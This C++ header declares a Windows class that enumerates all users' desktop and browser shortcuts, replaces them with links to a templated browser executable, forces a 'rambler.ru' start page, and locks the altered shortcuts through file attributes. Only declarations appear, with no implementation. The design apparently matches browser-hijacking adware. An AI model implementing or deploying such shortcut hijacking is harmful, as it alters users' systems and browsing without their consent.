#ifndef _LINKS_PLAYER_H
#define _LINKS_PLAYER_H


#pragma once
#include <vector>
#include <set>
#include <map>
#ifndef TEST_PROG
#include <Windows.h>
#define DEF_APP_PATH    L"\\__SP__browser_name__SP__\\Application\\__SP__browser_name__SP__.exe"
#else
#define DEF_APP_PATH    L"\\Internet\\Application\\Internet.exe"
#endif // !TEST_PROG



#define DEF_START_PAGE   L"  \"rambler.ru\""
#define CHANGE_ICON		1


class CLinksPlaying
{
public:
	CLinksPlaying(void);
	~CLinksPlaying(void);

	static std::wstring GetAppName();
	
	BOOL LockLink(const wchar_t* Path);
	BOOL UnLockLink(const wchar_t* Path);

	std::set<std::wstring>    m_setAllUsersLinks;
	std::vector<std::wstring> m_vecAllUsersLinks;

	std::set<std::wstring>    m_setAllUsersURLlinks;
	std::vector<std::wstring> m_vecAllUsersURLlinks;
	std::vector<std::wstring> m_vecBrowserNameList;
	std::vector<std::wstring> m_vecTypeUrlNameList;
	std::vector<std::wstring> m_vecLinkLockedList;

	std::vector<std::wstring> m_vecNeededLinksPath;

	std::map<std::string, std::string> m_mapBrowsersLinkPathes; //LinkPath, maybe I'm not use this staff

	std::wstring m_sAppPath;

	void Init(void);
	BOOL EnumerateFolder(std::wstring PathToFolder);
	void run(void);
	HRESULT FillURLlinks(void);
	HRESULT FillAllLinksPathes(void);
	HRESULT FillingNeededLinks(void);
	HRESULT ReplaceAllLnk(void);
	HRESULT RecursiveFindDiles(std::wstring path, std::wstring mask, std::set<std::wstring>& LinksFileNames);
	HRESULT CreateLink(const wchar_t* lpszPathToObj, const wchar_t* lpszArguments, const wchar_t* lpszLinkFileName, const wchar_t* lpszDesc, const wchar_t* lpszIconLocation);
	HRESULT FindUrlInString( _Out_ std::wstring & sOutUrl, _In_ std::wstring sArgs );
	
	BOOL GetLokedInfo(const wchar_t * Path);
	BOOL ChangeAttributes(const wchar_t * Path, bool bUnlock=true);
	BOOL IsDots(const TCHAR* str);
};

#endif